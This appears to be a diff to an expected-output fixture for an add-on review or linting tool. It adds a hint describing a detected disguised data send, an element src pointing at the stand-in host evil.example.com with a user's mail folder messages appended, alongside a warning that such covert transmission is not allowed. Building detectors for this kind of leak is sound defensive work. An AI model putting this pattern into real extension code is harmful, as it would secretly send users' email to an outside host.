@@ -110,7 +110,7 @@
         "column": 0
       },
       "item": null,
-      "hint": null,
+      "hint": "disguised data send (element-src) \"https://evil.example.com/?d=\" + messenger.messages.list(folderId)",
       "message": "This add-on appears to send data through a resource URL (image/iframe/media src) - a channel not meant for data transmission. Disguising transmission this way is not allowed, even with the user’s consent. Use a normal request and disclose what is sent."
     }
   ]
